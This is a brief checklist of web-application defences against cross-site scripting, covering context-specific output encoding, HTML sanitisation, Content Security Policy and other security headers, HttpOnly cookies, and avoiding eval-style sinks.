- [ ] Encoding is performed at output time, specific to each context
- [ ] HTML sanitizer (DOMPurify) is used when rich HTML input is required
- [ ] Content Security Policy (CSP) headers are implemented
- [ ] X-XSS-Protection and X-Content-Type-Options headers are set
- [ ] Cookie HttpOnly flag is set to prevent JavaScript access
- [ ] No user input reaches eval(), new Function(), or setTimeout with strings
- [ ] Framework auto-escaping is enabled and not bypassed

---
